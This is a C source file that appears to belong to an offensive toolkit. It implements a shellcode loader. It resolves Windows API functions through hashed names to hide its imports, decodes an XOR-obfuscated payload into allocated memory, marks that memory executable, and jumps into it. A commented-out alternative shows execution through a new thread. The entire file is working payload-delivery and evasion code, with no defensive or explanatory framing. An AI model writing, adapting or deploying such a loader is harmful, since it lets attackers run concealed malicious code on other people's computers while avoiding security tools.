#include <stdint.h>
#include "api_resolve.h"
#include "codasm_decoder.h"

INLINE void free_buffer(LPVOID pAddress, uint32_t CA_OUTPUT_LEN)
{
    VIRTUALFREE pVirtualFree = (VIRTUALFREE)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_VIRTUALFREE);
    pVirtualFree(pAddress, CA_OUTPUT_LEN, MEM_DECOMMIT);
}

typedef int (*fptr)();

uint32_t process(uint8_t *CA_PAYLOAD, uint32_t CA_PAYLOAD_LEN, uint32_t CA_OUTPUT_LEN, uint64_t CA_XORKEY)
{
    VIRTUALALLOC pVirtualAlloc = (VIRTUALALLOC)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_VIRTUALALLOC);

    LPVOID pAddress = pVirtualAlloc(NULL, CA_OUTPUT_LEN, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL)
        return 1;

    int32_t res = decode(CA_PAYLOAD, CA_PAYLOAD_LEN, pAddress, CA_OUTPUT_LEN, CA_XORKEY);
    if (res < 0)
    {
        free_buffer(pAddress, CA_OUTPUT_LEN);
        return 2;
    }

    VIRTUALPROTECT pVirtualProtect = (VIRTUALPROTECT)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_VIRTUALPROTECT);
    DWORD oldProtect = 0;
    if (!pVirtualProtect(pAddress, CA_OUTPUT_LEN, PAGE_EXECUTE_READ, &oldProtect))
    {
        free_buffer(pAddress, CA_OUTPUT_LEN);
        return 3;
    }

    // TODO: Make this a configurable option
    // CREATETHREAD pCreateThread = (CREATETHREAD)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYTPED_HASH_CREATETHREAD);
    // HANDLE hThread = pCreateThread(NULL, 0, pAddress, 0, 0, NULL);
    // if (!hThread) {
    //     free_buffer(pAddress, CA_OUTPUT_LEN);
    //     return 4;
    // }
    ((fptr)(pAddress))();

    return 0x420;
}